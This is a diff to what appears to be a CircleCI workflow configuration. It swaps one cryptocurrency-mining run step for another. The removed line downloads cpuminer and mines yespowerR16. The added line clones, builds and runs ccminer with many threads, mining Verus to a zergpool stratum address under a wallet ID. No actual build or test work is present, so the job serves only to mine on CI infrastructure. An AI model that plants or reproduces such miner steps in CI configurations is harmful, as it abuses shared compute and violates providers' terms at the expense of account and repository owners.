@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  mkdir cpuminer-opt-rplant && cd cpuminer-opt-rplant && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a yespowerR16 -o stratum+tcp://yespowerR16.asia.mine.zergpool.com:6534 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=YTN,ID=Cloud -t 32
+      - run:  apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer  -a verus  -o stratum+tcp://verushash.asia.mine.zergpool.com:3300  -u  A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=VRSC,ID=Reborn  -t 36
